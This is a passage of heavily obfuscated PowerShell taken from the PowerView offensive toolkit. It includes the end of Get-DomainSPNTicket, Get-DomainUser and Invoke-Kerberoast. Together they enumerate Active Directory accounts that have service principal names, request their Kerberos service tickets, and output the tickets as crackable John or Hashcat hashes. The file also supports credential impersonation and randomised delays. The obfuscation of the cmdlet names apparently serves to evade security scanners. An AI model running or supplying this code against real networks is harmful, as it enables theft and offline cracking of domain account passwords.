                    if(${M`AT`CHEs}."DAta`T`oend".("{0}{1}"-f'Substri','ng').Invoke(${ciphEr`TEx`TL`en}*2, 4) -ne ("{1}{0}"-f'2','A48')) {
                        &("{2}{1}{0}" -f 'ng','ni','Write-War') ('Erro'+'r '+'parsin'+'g'+' '+'ciphe'+'rtex'+'t '+'fo'+'r '+'t'+'he '+'S'+'PN '+' '+(('exz'+'(ex'+'zTicket.'+'S'+'ervicePri'+'n'+'cipa'+'l'+'Name'+')'+'. ')-REPLAce  'exz',[CHar]36)+'U'+'se '+'t'+'he '+'T'+'i'+'cketBy'+'teHexStrea'+'m '+'fie'+'ld '+'an'+'d '+'ex'+'trac'+'t '+'t'+'he '+'h'+'ash '+'o'+'ffli'+'ne '+'wi'+'th '+('Get-Ke'+'rb'+'ero'+'a'+'st'+'HashF'+'r'+'om'+'APReqgDM')."r`Ep`lAce"('gDM',[stRINg][cHAR]34))
                        ${Ha`SH} = ${Nu`Ll}
                        ${O`UT} | &("{1}{0}{2}" -f'Memb','Add-','er') ("{1}{0}{2}" -f'per','Notepro','ty') ("{2}{1}{0}{4}{3}"-f 'te','tBy','Ticke','xStream','He') (  ( &("{1}{0}" -f'T-ITeM','GE')  ("Va"+"riaB"+"lE:b"+"Sm")  )."VAl`UE"::("{0}{2}{1}" -f 'ToS','ring','t').Invoke(${tiC`K`E`TbY`TeSTrEam}).("{1}{0}{2}"-f'eplac','R','e').Invoke('-',''))
                    } else {
                        ${hA`Sh} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${O`UT} | &("{0}{2}{3}{1}"-f'Ad','mber','d-M','e') ("{0}{2}{1}" -f'Not','roperty','ep') ("{4}{5}{0}{1}{3}{2}" -f 'etB','yteH','Stream','ex','Tic','k') ${nu`ll}
                    }
                } else {
                    &("{3}{2}{0}{1}"-f'Warni','ng','e-','Writ') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${Ha`sh} = ${nU`LL}
                    ${O`UT} | &("{0}{1}{2}" -f'Ad','d-M','ember') ("{0}{1}{2}"-f 'Notepro','per','ty') ("{2}{1}{0}{3}"-f'tByteHexStr','e','Tick','eam') ( (  &("{1}{0}"-f'M','iTe')  ("va"+"rIaB"+"l"+"e:BsM") )."V`AlUE"::("{0}{1}{2}" -f 'T','o','String').Invoke(${tiC`KEt`ByTE`STRe`AM}).("{2}{1}{0}" -f'e','lac','Rep').Invoke('-',''))
                }

                if(${H`ASH}) {
                    if (${OU`TpUtf`OrM`At} -match ("{0}{1}"-f 'J','ohn')) {
                        ${hAS`hfOR`mat} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${D`ISTING`U`IsH`EdnA`me} -ne ("{2}{0}{1}" -f 'NOW','N','UNK')) {
                            ${us`erd`OMA`IN} = ${D`iST`iNGuis`h`eDNa`mE}.("{1}{2}{0}" -f 'ing','Su','bStr').Invoke(${disti`N`GUiSHED`N`AME}.("{0}{1}"-f 'In','dexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${Us`ErDom`AIN} = ("{2}{1}{0}"-f 'KNOWN','N','U')
                        }

                        
                        ${hA`sHf`oRmaT} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${O`Ut} | &("{2}{0}{1}"-f '-Membe','r','Add') ("{1}{3}{2}{0}" -f 'ty','Notepro','r','pe') ("{1}{0}" -f'sh','Ha') ${Ha`sH`For`mAT}
                }

                ${O`Ut} | &("{1}{2}{0}"-f 'mber','Add','-Me') ("{1}{3}{2}{0}"-f'rty','Not','ope','epr') ("{1}{2}{0}{4}{3}" -f'tNa','SamAccou','n','e','m') ${SAM`ACcoU`Ntna`Me}
                ${o`UT} | &("{1}{2}{0}"-f'r','Add-M','embe') ("{3}{1}{2}{0}" -f'erty','otep','rop','N') ("{3}{0}{1}{2}" -f 'stinguis','hed','Name','Di') ${diStI`N`GUIsh`E`dnamE}
                ${o`UT} | &("{0}{2}{1}"-f'Add','er','-Memb') ("{0}{1}{2}" -f 'Note','prop','erty') ("{3}{2}{0}{1}" -f 'ncipa','lName','vicePri','Ser') ${T`icKEt}."SerVIceP`R`I`NciP`ALnAMe"
                ${O`Ut}."PSo`B`ject"."TYpE`N`AmES".("{1}{0}" -f 'sert','In').Invoke(0, ("{2}{3}{5}{4}{0}{1}" -f'N','Ticket','Pow','erV','.SP','iew'))
                &("{2}{3}{0}{1}"-f 'pu','t','Write-','Out') ${O`UT}
            }
            
            &("{0}{1}{2}"-f'St','art-Sl','eep') -Seconds ${ra`NdNo}.("{1}{0}"-f'ext','N').Invoke((1-${jit`T`er})*${de`lAY}, (1+${JiTt`eR})*${de`LAy})
        }
    }

    END {
        if (${LOgo`N`TokEn}) {
            &("{1}{3}{2}{5}{4}{0}" -f 'f','Invo','R','ke-','Sel','evertTo') -TokenHandle ${lOgO`N`TO`KEN}
        }
    }
}

function G`Et-`dOMaI`NUS`Er {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{5}{4}{6}{2}{3}{0}{1}" -f'gnment','s','rsMoreThan','Assi','clar','UseDe','edVa','PS'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}{3}"-f 'PSShould','Pro','ces','s'}, '')]
    [OutputType({"{1}{2}{0}"-f 'ser','PowerV','iew.U'})]
    [OutputType({"{3}{1}{0}{4}{2}" -f 'ser','U','aw','PowerView.','.R'})]
    [CmdletBinding(defaUltparaMeTeRsETNAmE = {"{4}{1}{0}{3}{2}"-f'Delegati','low','n','o','Al'})]
    Param(
        [Parameter(posITioN = 0, vAluEFroMpipElinE = ${t`Rue}, vALUEfROMpiPElInEByproPErtyNAmE = ${tr`UE})]
        [Alias({"{0}{1}{2}{3}"-f'Di','stinguis','hed','Name'}, {"{0}{3}{4}{2}{1}"-f'Sa','ame','ountN','mA','cc'}, {"{1}{0}" -f 'me','Na'}, {"{3}{0}{1}{5}{6}{2}{4}"-f 'er','Distin','s','Memb','hedName','gu','i'}, {"{2}{1}{0}"-f'me','mberNa','Me'})]
        [String[]]
        ${IDEnT`ItY},

        [Switch]
        ${S`pN},

        [Switch]
        ${AdMi`N`cOu`Nt},

        [Parameter(PARaMETersetname = "Al`LowDe`leg`AT`ion")]
        [Switch]
        ${aLlowDe`legA`TI`oN},

        [Parameter(pARamEteRsEtNamE = "DiSALlo`W`dE`lEGATI`on")]
        [Switch]
        ${dI`saLLo`w`del`egation},

        [Switch]
        ${tr`U`StEDToaU`Th},

        [Alias({"{0}{4}{7}{6}{3}{2}{1}{5}"-f 'K','Re','Not','auth','erber','quired','Pre','os'}, {"{2}{0}{1}"-f 'a','uth','NoPre'})]
        [Switch]
        ${pRE`AuTH`NotrEQ`UIr`eD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`M`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'te','Fil','r'})]
        [String]
        ${lDApfi`L`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`ROper`TiES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'ath','A','DSP'})]
        [String]
        ${SeARChb`A`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}" -f't','DomainCon','r','oller'})]
        [String]
        ${SE`Rv`er},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{1}{2}{0}"-f 'l','OneLev','e'}, {"{0}{1}" -f'Subtr','ee'})]
        [String]
        ${sEA`RCHS`cOpe} = ("{1}{0}{2}" -f 'ubt','S','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESu`ltp`AgEsiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERVE`R`TiMelI`mIT},

        [ValidateSet({"{0}{1}"-f'Da','cl'}, {"{1}{0}" -f 'oup','Gr'}, {"{0}{1}" -f'N','one'}, {"{0}{1}" -f'Owne','r'}, {"{0}{1}" -f 'Sac','l'})]
        [String]
        ${Se`C`URIT`Ym`ASks},

        [Switch]
        ${t`OMbs`ToNe},

        [Alias({"{0}{1}" -f 'Return','One'})]
        [Switch]
        ${Fi`NdO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedE`NtiAl} =   ${jhU`w`95}::"eM`Pty",

        [Switch]
        ${r`Aw}
    )

    BEGIN {
        ${seArCHErArg`Um`E`NTs} = @{}
        if (${P`S`BouNDpAr`A`metE`Rs}[("{0}{1}"-f 'Doma','in')]) { ${sEARc`herARGuM`e`NtS}[("{1}{0}"-f'main','Do')] = ${D`oMain} }
        if (${pSBOUn`dpaR`Ame`TE`RS}[("{2}{1}{0}" -f 'es','roperti','P')]) { ${SeAr`CHE`RaRgumen`TS}[("{2}{1}{0}"-f's','ie','Propert')] = ${p`Ro`PERtI`eS} }
        if (${ps`BouNdPa`RAme`TerS}[("{0}{1}{3}{2}"-f 'S','ea','hBase','rc')]) { ${sea`RC`heR`A`RguM`ENTs}[("{2}{0}{1}"-f'chBas','e','Sear')] = ${seARCH`BA`se} }
        if (${pSb`ouN`dP`ARAMeTERs}[("{0}{1}" -f 'Serve','r')]) { ${s`EaRChERAr`G`Uments}[("{1}{0}"-f 'erver','S')] = ${s`ErVer} }
        if (${PsbO`U`NdpARA`Me`TERs}[("{2}{0}{1}" -f'earchS','cope','S')]) { ${seAr`chERaRgU`MeN`Ts}[("{2}{3}{0}{1}"-f 'S','cope','Sear','ch')] = ${SEA`RC`h`sCOpe} }
        if (${pSBO`UNdPA`R`AmETers}[("{1}{2}{0}"-f'ze','ResultPa','geSi')]) { ${seAr`C`he`RA`RGuMen`Ts}[("{1}{2}{3}{0}{4}"-f 'ag','R','e','sultP','eSize')] = ${reSult`PaGEsi`Ze} }
        if (${pSboUNdPa`Ram`Ete`Rs}[("{3}{0}{4}{2}{1}" -f 'r','eLimit','Tim','Se','ver')]) { ${sEarcHeRarg`U`me`NTs}[("{0}{3}{2}{1}"-f'S','Limit','rTime','erve')] = ${sERv`eRtiMELI`Mit} }
        if (${P`s`BOuND`Par`AmETErS}[("{2}{0}{3}{1}"-f'ur','sks','Sec','ityMa')]) { ${sea`Rc`hERARGU`MeNtS}[("{1}{2}{0}"-f 's','SecurityM','ask')] = ${SEcUrITY`Ma`S`kS} }
        if (${p`sbo`Un`DPAR`AMETERS}[("{3}{0}{1}{2}" -f 'mbs','to','ne','To')]) { ${Sea`Rc`H`ERarGUMents}[("{1}{2}{0}"-f 'e','To','mbston')] = ${t`oMBSt`oNe} }
        if (${p`SB`OUndpAramEt`ERs}[("{0}{1}{2}" -f 'Cre','denti','al')]) { ${s`eA`RcHe`RARgUMEntS}[("{2}{1}{3}{0}"-f'ntial','ed','Cr','e')] = ${cReDE`Nti`AL} }
        ${uSers`E`A`RCHeR} = &("{3}{5}{1}{4}{2}{0}" -f'r','n','earche','Get-Do','S','mai') @SearcherArguments
    }

    PROCESS {
        
        
        
        

        if (${u`SE`R`sear`cHeR}) {
            ${I`denTI`TYfI`L`Ter} = ''
            ${fi`Lt`eR} = ''
            ${iDe`NTIty} | &("{2}{0}{3}{1}" -f 'he','ct','W','re-Obje') {${_}} | &("{0}{1}{2}{3}" -f'ForE','ach-Ob','jec','t') {
                ${iD`entITyi`NSt`An`Ce} = ${_}.("{1}{0}" -f'eplace','R').Invoke('(', '\28').("{2}{1}{0}"-f'ace','l','Rep').Invoke(')', '\29')
                if (${iDE`NtITyi`NSta`NCe} -match ("{0}{1}" -f '^S-1','-')) {
                    ${IdENtIT`Yf`i`l`TER} += "(objectsid=$IdentityInstance)"
                }
                elseif (${I`DeNt`ITYiNsT`Ance} -match ("{0}{1}"-f '^CN','=')) {
                    ${IdE`NT`IT`YF`ilTer} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${P`Sb`oUnd`p`ArAmetERs}[("{0}{1}"-f 'Do','main')]) -and (-not ${p`sb`O`UNdParA`me`TeRS}[("{1}{0}{2}" -f 'c','Sear','hBase')])) {
                        
                        
                        ${iDe`NTITY`DOm`Ain} = ${IDE`NTItY`inStA`NcE}.("{1}{2}{0}"-f'g','SubStri','n').Invoke(${idE`NT`iTYiN`STA`N`cE}.("{1}{0}"-f 'ndexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{3}{2}{1}{0}" -f'e','Verbos','ite-','Wr') ('['+'Get-D'+'o'+'ma'+'inUser] '+'Ext'+'rac'+'ted '+'d'+'omain'+' '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${S`Ea`RC`hE`RArG`UmeNTS}[("{1}{0}"-f 'main','Do')] = ${IdEnTityD`O`mA`In}
                        ${usEr`SEArc`H`ER} = &("{3}{4}{1}{2}{0}" -f 'earcher','i','nS','G','et-Doma') @SearcherArguments
                        if (-not ${U`S`eRse`Archer}) {
                            &("{4}{2}{1}{0}{3}" -f 'rni','a','ite-W','ng','Wr') ('[G'+'e'+'t-'+'DomainUser] '+'Unable'+' '+'to'+' '+'retrieve'+' '+'doma'+'in'+' '+'searc'+'h'+'er '+'f'+'or '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${IdeNtiTYiNs`TA`N`ce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gU`iDBy`Te`s`TRiNG} = (([Guid]${iDENtIt`yIn`sTa`N`CE}).("{0}{2}{1}"-f'ToByteAr','ay','r').Invoke() | &("{0}{2}{1}"-f 'ForEach-O','ct','bje') { '\' + ${_}.("{0}{1}{2}"-f 'ToSt','rin','g').Invoke('X2') }) -join ''
                    ${IDe`NtIt`y`FILTer} += "(objectguid=$GuidByteString)"
                }
                elseif (${i`dENTItY`In`STANCe}.("{0}{1}{2}" -f 'Co','nt','ains').Invoke('\')) {
                    ${COn`VEr`T`EdID`eNti`T`y`I`NstAncE} = ${Id`eN`TITY`I`NstanCE}.("{2}{0}{1}" -f'c','e','Repla').Invoke('\28', '(').("{1}{0}"-f'e','Replac').Invoke('\29', ')') | &("{1}{0}{3}{2}" -f 'AD','Convert-','e','Nam') -OutputType ("{0}{1}{2}"-f'Ca','n','onical')
                    if (${COn`VE`RTeDI`deNt`itYin`sT`A`N`Ce}) {
                        ${U`SE`RdO`MaiN} = ${cO`NvErTe`DI`d`EnTItYINs`T`A`NcE}.("{1}{0}{2}" -f'r','SubSt','ing').Invoke(0, ${cONVErT`Ed`IDenTI`TYiNsT`ANCE}.("{1}{0}"-f'f','IndexO').Invoke('/'))
                        ${uS`ERn`AME} = ${idEnTi`Ty`I`NsTancE}.("{1}{0}"-f 'lit','Sp').Invoke('\')[1]
                        ${Id`EntI`TyFI`lTEr} += "(samAccountName=$UserName)"
                        ${SEa`RChEr`ArguM`en`TS}[("{1}{0}"-f 'n','Domai')] = ${Us`Erd`Oma`In}
                        &("{2}{1}{0}{3}"-f 'te-','i','Wr','Verbose') ('['+'Get'+'-DomainUser'+'] '+'Ex'+'tr'+'acted '+'d'+'omain'+' '+"'$UserDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${USErsEA`RcH`Er} = &("{3}{1}{0}{2}"-f 'c','omainSear','her','Get-D') @SearcherArguments
                    }
                }
                else {
                    ${I`DeNTITyFi`L`T`er} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${IDENt`ityfiL`TER} -and (${i`d`eNt`ItYfi`lTER}.("{1}{0}" -f 'rim','T').Invoke() -ne '') ) {
                ${F`ilt`er} += "(|$IdentityFilter)"
            }

            if (${PSbOu`Ndp`ArAm`E`TeRs}['SPN']) {
                &("{0}{2}{4}{3}{1}"-f'Wr','se','ite-V','rbo','e') ("{3}{6}{8}{1}{4}{14}{7}{11}{13}{5}{0}{10}{12}{9}{2}"-f'nc','omainUser] Sea','s','[G','rchin','ervice pri','e','r','t-D','name','ipal',' non-null ',' ','s','g fo')
                ${FI`LT`ER} += (("{6}{4}{3}{2}{0}{5}{7}{1}" -f'rinci','e=*)','P','e','servic','pal','(','Nam'))
            }
            if (${PS`BO`U`NDp`ARame`TERs}[("{2}{3}{0}{1}"-f'legat','ion','Al','lowDe')]) {
                &("{0}{2}{3}{1}"-f'Write-Ver','e','b','os') ("{14}{10}{9}{7}{13}{2}{12}{5}{11}{0}{6}{1}{4}{3}{8}"-f 's','o ','rching ',' b','can','us',' wh','ainUser] Se','e delegated','om','Get-D','er','for ','a','[')
                
                ${fiL`T`eR} += ("{11}{1}{4}{8}{9}{0}{6}{3}{2}{7}{5}{10}{12}" -f'1.2.','e','13','40.1','rAcc','0','8','556.1.4.8','o','untControl:','3:=10485','(!(us','74))')
            }
            if (${pS`BO`UnD`PaRaMEteRS}[("{2}{1}{0}{3}"-f'Delega','llow','Disa','tion')]) {
                &("{1}{0}{2}"-f'o','Write-Verb','se') ("{9}{19}{3}{7}{18}{0}{17}{13}{12}{10}{4}{6}{1}{20}{15}{5}{14}{11}{16}{8}{2}"-f 'i',' sensitive and','n','nUs','ho',' ',' are','er] Searc','atio','[Get-D','s w','rusted for dele','or user','g f','t','ot','g','n','h','omai',' n')
                ${fI`lTER} += ("{9}{14}{6}{13}{0}{10}{8}{11}{7}{3}{4}{12}{5}{1}{2}{15}" -f'un','.1.4.','803:=1','.','840','6','A','2','tro','(us','tCon','l:1.','.11355','cco','er','048574)')
            }
            if (${P`sbO`UnDPaRAM`eTERS}[("{1}{2}{0}" -f't','Admin','Coun')]) {
                &("{1}{0}{2}{3}"-f 'e','Write-V','rb','ose') ("{2}{3}{1}{6}{4}{5}{9}{0}{8}{7}"-f' adminCou','-','[Ge','t','ainUs','er','Dom','1','nt=','] Searching for')
                ${f`iLTer} += ("{1}{0}{2}"-f 'nt','(admincou','=1)')
            }
            if (${PsB`Oundp`AR`AmeTE`RS}[("{3}{2}{0}{1}"-f 'Aut','h','edTo','Trust')]) {
                &("{1}{2}{3}{0}{4}" -f'os','Wr','ite-Ver','b','e') ("{7}{3}{14}{6}{16}{1}{17}{18}{10}{11}{21}{4}{0}{2}{9}{5}{12}{19}{13}{22}{20}{8}{15}" -f'to ','u','a','-D','ed ','then',' Searchi','[Get','a','u','that are',' trus','ticate ','or o','omainUser]','ls','ng for ','ser','s ','f','ip','t','ther princ')
                ${fi`L`Ter} += ("{3}{4}{0}{1}{2}{5}" -f'ed','tode','lega','(','msds-allow','teto=*)')
            }
            if (${pSbOU`ND`pa`RameTErs}[("{1}{0}{2}{3}" -f 'NotRequ','Preauth','ire','d')]) {
                &("{3}{0}{1}{2}"-f'-Ver','bo','se','Write') ("{8}{23}{4}{2}{22}{5}{0}{18}{17}{20}{12}{16}{3}{15}{14}{10}{11}{25}{19}{24}{1}{7}{21}{6}{13}{9}" -f 'o','p','ser] Sear','o not ','nU','ing f','h','reau','[G','nticate','ire k','erbe','nts','e','equ','r',' that d','se','r u','s','r accou','t','ch','et-Domai',' ','ro')
                ${fI`LtEr} += (("{9}{10}{11}{1}{4}{5}{6}{7}{3}{0}{8}{2}" -f'.840.1','t','6.1.4.803:=4194304)','2','Co','n','t','rol:1.','1355','(us','erA','ccoun'))
            }
            if (${pSbO`UNd`P`ARAMe`Te`RS}[("{0}{2}{1}" -f'LDA','ter','PFil')]) {
                &("{2}{0}{3}{1}"-f 'rit','erbose','W','e-V') ('[Ge'+'t'+'-'+'DomainUser] '+'U'+'si'+'ng '+'a'+'d'+'ditional '+'LDAP'+' '+'f'+'ilter'+': '+"$LDAPFilter")
                ${FIlT`er} += "$LDAPFilter"
            }

            
            ${u`AcFI`LtEr} | &("{1}{2}{0}" -f 'ect','Wh','ere-Obj') {${_}} | &("{2}{0}{3}{4}{1}" -f 'bj','t','ForEach-O','e','c') {
                if (${_} -match ("{1}{0}"-f'*','NOT_.')) {
                    ${uacF`I`elD} = ${_}.("{0}{2}{1}" -f'Subs','ng','tri').Invoke(4)
                    ${u`ACV`AluE} = [Int](${U`AcE`Num}::${U`AcFiE`Ld})
                    ${F`i`lter} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${UAc`Va`LuE} = [Int](${U`ACe`NuM}::${_})
                    ${F`ILt`eR} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${Us`e`R`SeARCHEr}."fI`L`TeR" = "(&(samAccountType=805306368)$Filter)"
            &("{3}{0}{2}{4}{1}" -f 'te','e','-Ve','Wri','rbos') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if (${pSBouND`PaR`AM`eterS}[("{0}{1}" -f 'Find','One')]) { ${r`esUlTS} = ${usERs`E`Ar`CHEr}.("{2}{0}{1}"-f'n','e','FindO').Invoke() }
            else { ${r`ESUl`Ts} = ${u`SErsEAr`C`h`Er}.("{0}{2}{1}" -f 'FindA','l','l').Invoke() }
            ${R`esu`ltS} | &("{2}{0}{1}"-f'r','e-Object','Whe') {${_}} | &("{0}{1}{3}{2}"-f'For','Each-Obj','t','ec') {
                if (${pS`BOUNd`PAR`Amete`Rs}['Raw']) {
                    
                    ${uS`ER} = ${_}
                    ${U`SeR}."p`sobjEct"."t`YPe`NamEs".("{1}{0}" -f 'nsert','I').Invoke(0, ("{2}{0}{3}{1}{4}{5}"-f 'werVi','w','Po','e','.User.Ra','w'))
                }
                else {
                    ${us`ER} = &("{2}{1}{4}{0}{3}" -f 'roper','onvert-LDA','C','ty','PP') -Properties ${_}."P`ROpEr`TiES"
                    ${U`sER}."PsO`BjeCt"."tY`P`eNameS".("{0}{1}"-f 'In','sert').Invoke(0, ("{1}{2}{3}{0}"-f '.User','Po','wer','View'))
                }
                ${u`sER}
            }
            if (${ReS`Ul`Ts}) {
                try { ${R`eSu`LTs}.("{2}{1}{0}"-f 'e','s','dispo').Invoke() }
                catch {
                    &("{1}{0}{3}{2}"-f 'rite','W','Verbose','-') ('[Get'+'-Dom'+'ain'+'User]'+' '+'Error'+' '+'dispos'+'i'+'ng'+' '+'of'+' '+'th'+'e '+'R'+'esult'+'s '+'objec'+'t:'+' '+"$_")
                }
            }
            ${U`Ser`sEA`Rc`hER}.("{0}{1}{2}"-f'd','is','pose').Invoke()
        }
    }
}


function InvOkE`-`k`e`RbeRO`AsT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}" -f'ess','ould','PSSh','Proc'}, '')]
    [OutputType({"{0}{4}{3}{2}{1}" -f 'Po','et','NTick','P','werView.S'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsiTIon = 0, VALUeFRoMPiPeline = ${TR`Ue}, VaLUEfrOMpipeliNeBypropeRtYNamE = ${T`RuE})]
        [Alias({"{5}{1}{4}{3}{0}{2}"-f'am','i','e','shedN','ngui','Dist'}, {"{3}{0}{2}{1}"-f 'un','Name','t','SamAcco'}, {"{0}{1}"-f'N','ame'}, {"{1}{2}{3}{0}{4}"-f 'rDisting','M','em','be','uishedName'}, {"{2}{0}{1}" -f 'm','e','MemberNa'})]
        [String[]]
        ${iD`eNt`ITy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'r','Filte'})]
        [String]
        ${l`d`Apfi`LteR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f 'Pa','ADS','th'})]
        [String]
        ${S`EaR`ChbaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{3}{2}{4}" -f 'o','D','ainControlle','m','r'})]
        [String]
        ${sE`RVer},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{0}{1}"-f'O','neLevel'}, {"{1}{0}" -f 'ubtree','S'})]
        [String]
        ${s`eArChsc`oPE} = ("{1}{0}{2}"-f 're','Subt','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`Esu`LtpaGesIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SER`VE`RtIM`El`ImIT},

        [Switch]
        ${ToM`BS`TonE},

        [ValidateRange(0,10000)]
        [Int]
        ${d`e`laY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${j`iT`TEr} = .3,

        [ValidateSet({"{0}{1}" -f'Jo','hn'}, {"{1}{0}{2}" -f'ashc','H','at'})]
        [Alias({"{2}{0}{1}"-f 'or','mat','F'})]
        [String]
        ${Ou`TPutfOrM`AT} = ("{1}{0}" -f 'n','Joh'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`edEn`TiaL} =   (&("{3}{2}{0}{1}"-f'hI','lDIteM','t-C','ge')  ('vArIAB'+'Le:'+'jhuw9'+'5'))."Val`UE"::"E`mpty"
    )

    BEGIN {
        ${u`serseA`R`C`herArgumEnTs} = @{
            'SPN' = ${Tr`UE}
            ("{2}{0}{1}"-f'ertie','s','Prop') = ("{12}{15}{4}{7}{10}{14}{2}{0}{9}{3}{8}{6}{1}{11}{13}{5}"-f 'n','vicepr','e,disti','uishedname,','a','palname','r','cco','se','g','un','in','sa','ci','tnam','m')
        }
        if (${p`sBoUNDpA`RAm`e`TerS}[("{0}{1}"-f'Dom','ain')]) { ${U`SERS`ea`Rc`He`RargUMEn`Ts}[("{0}{1}" -f 'Domai','n')] = ${doMA`iN} }
        if (${PS`BOU`NDParaMET`Ers}[("{0}{1}{3}{2}" -f 'LDAP','Filt','r','e')]) { ${usErseA`RC`he`R`A`RG`UMENTS}[("{0}{2}{1}" -f 'LD','r','APFilte')] = ${ldA`PFil`TER} }
        if (${p`sboun`DpArAm`e`TErs}[("{0}{1}{2}{3}"-f'Searc','h','Ba','se')]) { ${USE`R`s`eArCHeR`ARguME`NtS}[("{0}{1}{2}"-f'Searc','h','Base')] = ${s`EAr`chbA`se} }
        if (${Ps`B`o`UndpaRamEters}[("{0}{2}{1}"-f 'S','r','erve')]) { ${us`ErsEarcheRa`R`GumEN`TS}[("{1}{0}" -f 'r','Serve')] = ${SeR`V`er} }
        if (${P`SBouN`DpaRaM`ET`erS}[("{1}{0}{3}{2}" -f'c','Sear','Scope','h')]) { ${UsERs`e`Ar`C`herA`RGUmE`Nts}[("{0}{1}{2}" -f 'Sear','chSc','ope')] = ${s`EA`RChSCope} }
        if (${pS`Bo`U`NDpAR`AmeTERS}[("{1}{4}{3}{0}{2}" -f 'iz','Re','e','ltPageS','su')]) { ${uSe`RseArCher`A`RGu`MeN`Ts}[("{2}{1}{0}" -f'ize','esultPageS','R')] = ${R`esul`TPageSizE} }
        if (${P`SBound`Pa`Ram`ETers}[("{0}{2}{1}"-f'ServerTimeL','mit','i')]) { ${U`sERsEa`R`Che`RArgUmEnTS}[("{3}{4}{2}{1}{0}" -f'meLimit','Ti','er','Ser','v')] = ${SeRV`E`R`TiMEL`imiT} }
        if (${Ps`B`ou`NdPara`MET`erS}[("{1}{2}{0}"-f 'e','Tom','bston')]) { ${USe`RseARc`HerA`R`GUm`E`NtS}[("{0}{1}{2}" -f'Tom','bs','tone')] = ${TOM`BST`one} }
        if (${ps`Bou`N`DPa`R`AmeTeRS}[("{0}{2}{1}"-f 'Cre','tial','den')]) { ${UsE`RS`eA`R`CheRArG`Um`eNTs}[("{1}{0}{2}" -f'rede','C','ntial')] = ${cre`DEnt`iAl} }

        if (${PsB`OUn`d`par`AmeTeRS}[("{2}{1}{0}"-f 'l','a','Credenti')]) {
            ${L`OGon`TOk`en} = &("{5}{3}{1}{4}{2}{0}"-f'ion','UserImpe','sonat','ke-','r','Invo') -Credential ${cRedE`Nt`iaL}
        }
    }

    PROCESS {
        if (${P`SBOUn`D`PArAmE`TE`Rs}[("{1}{0}" -f'dentity','I')]) { ${USe`RsEA`Rcher`A`R`guMeNTs}[("{1}{0}"-f'ntity','Ide')] = ${IdEnt`I`TY} }
        &("{0}{2}{1}{3}{4}" -f 'G','Doma','et-','inUse','r') @UserSearcherArguments | &("{1}{0}{2}"-f'-','Where','Object') {${_}."sAmAcCouNt`N`A`mE" -ne ("{1}{0}{2}"-f'rbtg','k','t')} | &("{1}{4}{3}{0}{2}" -f 'nS','G','PNTicket','i','et-Doma') -Delay ${Del`AY} -OutputFormat ${OutpUt`F`O`RMat} -Jitter ${JI`Tt`eR}
    }

    END {
        if (${lOGO`Nto`keN}) {
            &("{3}{0}{2}{1}"-f'-R','Self','evertTo','Invoke') -TokenHandle ${l`Og`on`Token}
        }
    }
}


